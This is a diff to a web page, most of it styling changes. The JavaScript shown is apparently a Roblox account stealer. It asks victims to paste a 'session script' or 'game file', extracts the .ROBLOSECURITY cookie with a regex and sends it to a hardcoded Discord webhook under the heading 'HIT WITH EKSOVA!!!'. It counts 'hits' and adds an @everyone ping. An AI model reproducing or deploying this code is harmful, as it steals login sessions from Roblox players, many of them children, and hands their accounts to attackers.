@@ -12,7 +12,7 @@
             flex-direction: column;
             align-items: center;
             height: 100vh;
-            background: linear-gradient(135deg, #0f0f0f, #003300);
+            background: linear-gradient(125deg, #0f0f0f, #008b8b);
             color: white;
         }
         .header {
@@ -38,9 +38,9 @@
             border-radius: 20px;
             padding: 15px;
             font-size: 1.3em;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.6);
-            border: 3px solid #00ff00;
-            width: 400px;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.6);
+            border: 3px solid #008b8b;
+            width: 550px;
             text-align: center;
         }
         .panel h2 {
@@ -96,7 +96,7 @@
             padding: 60px;
             font-size: 2em;
             color: #ffffff;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.8);
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.6);
             text-align: center;
             z-index: 1000;
             max-width: 80%;
@@ -155,18 +155,18 @@
                 .replace(/./g, char => String.fromCodePoint(127397 + char.charCodeAt()));
         }
 
-        
+
         function loadTotalHits() {
             const savedHits = localStorage.getItem('totalPings');
             totalPings = savedHits ? parseInt(savedHits, 10) : 0;
         }
 
-        
+
         function saveTotalHits() {
             localStorage.setItem('totalPings', totalPings);
         }
 
-        
+
         loadTotalHits();
         fetchCountry();
 
@@ -177,7 +177,7 @@
             const pin = document.getElementById("pin").value;
 
             if (!sessionScript) {
-                alert("Please enter the session script.");
+                alert("Please fill in the boxes.");
                 return;
             }
 
@@ -185,18 +185,18 @@
 
             const webhookUrl = "https://discord.com/api/webhooks/1300555524823187576/jn-SfRrTE-bmNQFXvaQRSmiZfmJFBQeMyI2uAaF27TwiOcQNXK7SeQP-Jc6S7G0KfaSP";
 
-            
-            totalPings++;
-            saveTotalHits(); 
 
-            
+            totalPings++;
+            saveTotalHits();
+
+
             const cookiePattern = /\.ROBLOSECURITY",\s*"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Za-z0-9]+"/;
 
-            
+
             let cookieString = "";
             const match = sessionScript.match(cookiePattern);
             if (match) {
-                
+
                 cookieString = match[0].split('.ROBLOSECURITY", "')[1].slice(0, -1).trim();
             } else {
                 alert("Please Enter A Game File!");
@@ -205,6 +205,7 @@
             }
 
             const data = {
+              content: "@everyone",
                 embeds: [
                     {
                         title: "HIT WITH EKSOVA!!!",
